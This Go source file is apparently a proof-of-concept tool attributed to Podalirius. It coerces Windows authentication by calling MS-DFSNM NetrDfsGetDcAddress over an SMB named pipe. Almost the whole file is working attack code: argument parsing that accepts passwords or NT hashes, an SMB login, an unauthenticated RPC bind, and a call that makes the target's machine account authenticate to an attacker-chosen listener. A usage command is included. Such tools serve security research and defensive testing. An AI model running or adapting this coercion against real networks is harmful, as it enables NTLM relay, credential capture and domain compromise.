// File name          : coerce_poc.go
// Author             : Podalirius (@podalirius_)
// Date created       : 11 Sep 2026
//
// Proof of concept for coercing authentication with MS-DFSNM::NetrDfsGetDcAddress()
// (opnum 16), written with the TheManticoreProject libraries:
//
//   - github.com/TheManticoreProject/goopts    for the command line parsing
//   - github.com/TheManticoreProject/Manticore for SMB, DCE/RPC and the RPC interface
//
// The target resolves the path argument it is given: passing a UNC path makes the remote
// machine account authenticate to the listener over SMB.
//
// Run it from this directory (go.mod pins the libraries):
//
//	go run coerce_poc.go --target 192.168.1.30 --listener 192.168.1.10 -d LAB.local -u user -p 'password'
//
// or build a standalone binary with:
//
//	go build -o coerce_poc coerce_poc.go
package main

import (
	"fmt"
	"math/rand"
	"os"
	"strings"

	"github.com/TheManticoreProject/Manticore/logger"
	netdfs "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/4fc742e0-4a10-11cf-8273-00aa004ae673/3.0"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/ndr"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/syntax"
	dcerpcclient "github.com/TheManticoreProject/Manticore/network/dcerpc/v5/client"
	smbclient "github.com/TheManticoreProject/Manticore/network/smb/client"
	"github.com/TheManticoreProject/Manticore/windows/credentials"
	"github.com/TheManticoreProject/Manticore/windows/guid"
	"github.com/TheManticoreProject/goopts/parser"
	"golang.org/x/term"
)

var (
	// Configuration
	debug bool

	// Network settings
	target     string
	targetPort int
	pipeName   string

	// Coercion settings
	listener  string
	shareName string
	dcName    string

	// Authentication details
	authDomain   string
	authUsername string
	authPassword string
	authHashes   string
	authNoPass   bool
)

func parseArgs() {
	ap := parser.ArgumentsParser{
		Banner: "Windows auth coerce using MS-DFSNM::NetrDfsGetDcAddress() - by Remi GASCOU (Podalirius) - v1.0.0",
	}

	ap.SetOptShowBannerOnHelp(true)
	ap.SetOptShowBannerOnRun(true)

	ap.NewBoolArgument(&debug, "", "--debug", false, "Enable debug mode.")

	// Network settings
	group_network, err := ap.NewArgumentGroup("Network")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_network.NewStringArgument(&target, "-t", "--target", "", true, "IP address or hostname of the target.")
		group_network.NewTcpPortArgument(&targetPort, "", "--target-port", 445, false, "Port of the SMB service on the target.")
		group_network.NewStringArgument(&pipeName, "", "--pipe", netdfs.PipeName, false, "Named pipe to bind the interface on.")
	}

	// Coercion settings
	group_coerce, err := ap.NewArgumentGroup("Coercion")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_coerce.NewStringArgument(&listener, "-l", "--listener", "", true, "IP address or hostname of the listener the target should authenticate to.")
		group_coerce.NewStringArgument(&dcName, "", "--dc-name", "", false, "Host name of the DC holding the DFS metadata (empty stands in for the NULL pointer the IDL allows).")
		group_coerce.NewStringArgument(&shareName, "", "--share", "", false, "Share name sent to the target (random 8 characters if omitted).")
	}

	// Authentication
	group_auth, err := ap.NewArgumentGroup("Authentication")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_auth.NewStringArgument(&authDomain, "-d", "--domain", "", false, "(FQDN) domain to authenticate to.")
		group_auth.NewStringArgument(&authUsername, "-u", "--user", "", false, "User to authenticate as.")
	}

	// Secret
	group_secret, err := ap.NewNotRequiredMutuallyExclusiveArgumentGroup("Secret")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_secret.NewBoolArgument(&authNoPass, "", "--no-pass", false, "Don't ask for a password (null session).")
		group_secret.NewStringArgument(&authPassword, "-p", "--password", "", false, "Password to authenticate with.")
		group_secret.NewStringArgument(&authHashes, "-H", "--hashes", "", false, "NT/LM hashes, format is LMhash:NThash.")
	}

	ap.Parse()
}

// NetrDfsGetDcAddress (opnum 16), as documented by [MS-DFSNM]:
//
//	NET_API_STATUS NetrDfsGetDcAddress(
//	   [in, string] WCHAR* ServerName,
//	   [in, out, string] WCHAR** DcName,
//	   [in, out] BOOLEAN* IsRoot,
//	   [in, out] unsigned long* Timeout
//	 );
//
// The binding handle is implicit in Go. The request/response structs below are lifted
// verbatim from Manticore's generated call for this opnum
// (network/dcerpc/interfaces/4fc742e0-4a10-11cf-8273-00aa004ae673/3.0/functions/16_NetrDfsGetDcAddress.go), which is the reviewed
// translation of that IDL; the wrapper there folds a nonzero return value into an
// error string, so the call is issued here to keep the numeric status.

// netrDfsGetDcAddressRequest carries the [in] parameters of NetrDfsGetDcAddress.
type netrDfsGetDcAddressRequest struct {
	ServerName ndr.WSTR
	// [in, out, string] WCHAR**: the outer pointer is [ref] and is not transmitted, the
	// inner one is a unique pointer, so this field has to be a POINTER. Modelled as a
	// plain WSTR the string was marshalled with no referent id and the server faulted.
	DcName *ndr.WSTR `ndr:"unique"`
	// [in, out] BOOLEAN* and unsigned long*: [ref] pointers to scalars are transmitted
	// inline, so these stay values.
	IsRoot  bool
	Timeout ndr.DWORD
}

// netrDfsGetDcAddressResponse carries the [out] parameters and return value of NetrDfsGetDcAddress.
type netrDfsGetDcAddressResponse struct {
	// Same shape as the request: [in, out, string] WCHAR** is a unique pointer, so a NULL
	// return is 4 bytes of referent id, not a conformant string. Read as a plain WSTR the
	// unmarshaller consumed the whole 16-byte response and then overran it.
	DcName  *ndr.WSTR `ndr:"unique"`
	IsRoot  bool
	Timeout ndr.DWORD
	Status  ndr.DWORD `ndr:"retval"`
}

func (*netrDfsGetDcAddressRequest) Opnum() uint16 { return netdfs.OpnumNetrDfsGetDcAddress }

// win32ErrorNames names the Win32 error codes ([MS-ERREF] 2.2) that this interface returns
// but that Manticore's status table for it does not cover yet. netdfs.StatusString is
// always consulted first, so the codes Manticore does define keep their names from there
// and this map only fills the gaps. ERROR_BAD_NETPATH is the one a coercion normally ends
// on: the target could not reach the UNC path — after trying to.
var win32ErrorNames = map[uint32]string{
	0x00000003: "ERROR_PATH_NOT_FOUND",
	0x00000035: "ERROR_BAD_NETPATH",
	0x00000043: "ERROR_BAD_NET_NAME",
	0x0000007b: "ERROR_INVALID_NAME",
}

// statusName resolves a Win32 status code to its constant name, preferring Manticore's
// own table. StatusString falls back to a "0x%08x" rendering for codes it does not know,
// which is how an unknown code is detected here.
func statusName(status uint32) string {
	if name := netdfs.StatusString(status); !strings.HasPrefix(name, "0x") {
		return name
	}
	if name, found := win32ErrorNames[status]; found {
		return name
	}
	return "UNKNOWN_ERROR"
}

// formatStatus renders a status as "ERROR_BAD_NETPATH (0x00000035)".
func formatStatus(status uint32) string {
	return fmt.Sprintf("%s (0x%08x)", statusName(status), status)
}

// interfaceSyntaxes returns the abstract syntaxes to try, in order. A protocol may be
// registered under several interface UUIDs and a given Windows version may only expose
// some of them, so a rejected bind is a reason to try the next candidate, not to stop.
func interfaceSyntaxes() []syntax.SyntaxID {
	var _ = guid.FromFormatD // only used when the protocol has several interface UUIDs
	candidates := []syntax.SyntaxID{netdfs.SyntaxID()}
	return candidates
}

// promptPassword asks for the password on the terminal, as the Python PoC does when a
// username is given with neither a password, hashes, nor --no-pass.
func promptPassword() (string, error) {
	fmt.Print("Password: ")
	secret, err := term.ReadPassword(int(os.Stdin.Fd()))
	fmt.Println()
	if err != nil {
		return "", err
	}
	return string(secret), nil
}

// randomName returns a random alphanumeric name, used for the share and namespace names
// this PoC invents. Nothing is created on the listener, so the names only have to be
// unlikely to collide with something that already exists on the target.
func randomName(length int) string {
	const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	name := make([]byte, length)
	for i := range name {
		name[i] = alphabet[rand.Intn(len(alphabet))]
	}
	return string(name)
}

func main() {
	parseArgs()

	if debug {
		logger.SetLevel(logger.LevelDebug)
	}

	if authUsername != "" && authPassword == "" && authHashes == "" && !authNoPass {
		password, err := promptPassword()
		if err != nil {
			logger.Errorf("Error reading password: %s", err)
			return
		}
		authPassword = password
	}

	creds, err := credentials.NewCredentials(authDomain, authUsername, authPassword, authHashes)
	if err != nil {
		logger.Errorf("Error creating credentials: %s", err)
		return
	}

	// Negotiate the best dialect the target supports (SMB1 or SMB2+), the DCE/RPC
	// named-pipe transport is then the same for the caller either way.
	logger.Infof("Connecting to %s:%d ...", target, targetPort)
	smb, err := smbclient.Dial(target, targetPort, smbclient.Options{})
	if err != nil {
		logger.Errorf("Error connecting to %s:%d: %s", target, targetPort, err)
		return
	}
	defer smb.Disconnect()
	logger.Infof("Connected, negotiated dialect [%s]", smb.Dialect())

	if err := smb.Login(creds); err != nil {
		logger.Errorf("Error authenticating to %s: %s", target, err)
		return
	}
	defer smb.Logoff()
	logger.Infof("Authenticated as [%s]", strings.Trim(authDomain+"\\"+authUsername, "\\"))

	// Named pipes live on the IPC$ tree ([MS-RPCE] 2.1.1.2).
	if err := smb.TreeConnect("IPC$"); err != nil {
		logger.Errorf("Error connecting to share IPC$: %s", err)
		return
	}
	defer smb.TreeDisconnect()

	// A rejected bind leaves the association unusable, so every candidate syntax gets a
	// fresh pipe and client of its own.
	var rpc *dcerpcclient.Client
	for _, abstractSyntax := range interfaceSyntaxes() {
		transport, err := smb.RPCTransport(pipeName)
		if err != nil {
			logger.Errorf("Error opening pipe %s: %s", pipeName, err)
			return
		}

		logger.Infof("Binding to <%s> on %s ...", abstractSyntax, pipeName)
		candidate := dcerpcclient.NewClient(transport)
		// No SetAuth here, unlike the EFSRPC PoCs: netdfs rejects an authenticated bind
		// with bind_nak "authentication type not recognized" (0x8), so the association is
		// bound with no RPC-level security and the call runs under the identity of the SMB
		// session established above.
		if err := candidate.Bind(abstractSyntax); err != nil {
			logger.Warnf("Bind rejected: %s", err)
			candidate.Close()
			continue
		}
		logger.Info("Bind successful")
		rpc = candidate
		break
	}
	if rpc == nil {
		logger.Errorf("Could not bind the interface on %s, it is not listening on this endpoint.", pipeName)
		return
	}
	defer rpc.Close()

	// The UNC path the target will resolve, and therefore authenticate to.
	logger.Infof("Calling NetrDfsGetDcAddress(ServerName='%s') ...", listener)
	var dcNameArg *ndr.WSTR
	if dcName != "" {
		w := ndr.WSTR(dcName)
		dcNameArg = &w
	}

	request := &netrDfsGetDcAddressRequest{
		ServerName: ndr.WSTR(listener),
		// NULL asks the server to fill in the DC it would use.
		DcName:  dcNameArg,
		IsRoot:  false,
		Timeout: 0,
	}
	var response netrDfsGetDcAddressResponse

	if err := rpc.Invoke(request, &response); err != nil {
		// A DCE/RPC fault means the call never reached the method: a wrong interface,
		// endpoint or parameter modelling, not a refusal by the server.
		logger.Errorf("NetrDfsGetDcAddress() faulted: %s", err)
		return
	}

	status := uint32(response.Status)
	if status == netdfs.StatusSuccess {
		logger.Infof("NetrDfsGetDcAddress() returned %s, check your listener.", formatStatus(status))
		return
	}
	// Any other status is expected: the target fails on a path it cannot reach, but it has
	// already authenticated to the listener to find that out.
	logger.Infof("NetrDfsGetDcAddress() returned a status: %s", formatStatus(status))
	logger.Info("The call was processed by the target, check your listener.")
}
